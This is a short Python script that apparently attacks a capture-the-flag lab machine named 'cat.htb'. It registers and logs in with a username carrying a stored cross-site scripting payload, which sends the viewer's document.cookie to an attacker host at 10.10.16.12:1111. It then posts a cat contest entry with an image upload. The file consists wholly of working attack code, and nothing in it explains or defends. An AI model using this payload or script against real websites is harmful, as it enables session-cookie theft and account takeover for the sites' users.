import requests
import urllib.parse
import random

# Define the target URL
base_url = "http://cat.htb:80/join.php"
proxies = {'http':'http://localhost:8080'}

# Define the payload dynamically
username = "<script>document.location='http://10.10.16.12:1111/?c2='+document.cookie;</script>"
#username = "<script> alert(document.cookie); </script>"
email = f"email{random.randint(1,1000)}@gmail.com"

encoded_username = urllib.parse.quote(username)
encoded_email = urllib.parse.quote(email)

# Register request with payload injection
register_url = f"{base_url}?username={encoded_username}&email={encoded_email}&password=ciao&registerForm=Register"

session = requests.Session()
session.get(register_url,proxies=proxies)

# Login request with payload injection
login_url = f"{base_url}?loginUsername={encoded_username}&loginPassword=ciao&loginForm=Login"
session.get(login_url, proxies=proxies)

# Target URL
url = "http://cat.htb/contest.php"

# Form data
data = {
    "cat_name": "5",
    "age": "5",
    "birthdate": "2025-02-07",
    "weight": "6"
}

# Image file payload (Modify the path to an actual image file)
files = {
    "cat_photo": ("Screenshot_2025-01-31_09_09_18.png", open("/home/kali/Pictures/Screenshot_2025-01-31_09_09_18.png", "rb"), "image/png")
}

# Sending the request
response = session.post(url, data=data, files=files,  proxies=proxies)
